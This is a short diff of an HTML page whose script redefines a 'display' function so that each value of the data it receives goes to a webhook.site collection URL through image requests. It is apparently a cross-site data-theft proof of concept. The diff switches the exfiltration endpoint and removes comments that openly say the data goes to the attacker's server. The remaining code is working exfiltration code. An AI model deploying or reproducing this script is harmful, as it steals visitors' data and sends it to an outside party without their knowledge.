@@ -8,12 +8,10 @@
   <p>If you see this, you might be at risk!</p>
   
   <script>
-    // Redefine the display function to send data to the attacker's server
     function display(data) {
-      // Loop through the data and create an image tag to send the data to the attacker's server
       for (var key in data) {
         var img = new Image();
-        img.src = "http://webhook.site/4314bf30-5ce3-4919-a7ea-d88e77b2eb85/log?key=" + encodeURIComponent(data[key]);
+        img.src = "https://webhook.site/4314bf30-5ce3-4919-a7ea-d88e77b2eb85/?data=" + encodeURIComponent(data[key]);
         document.body.appendChild(img);
       }
     }
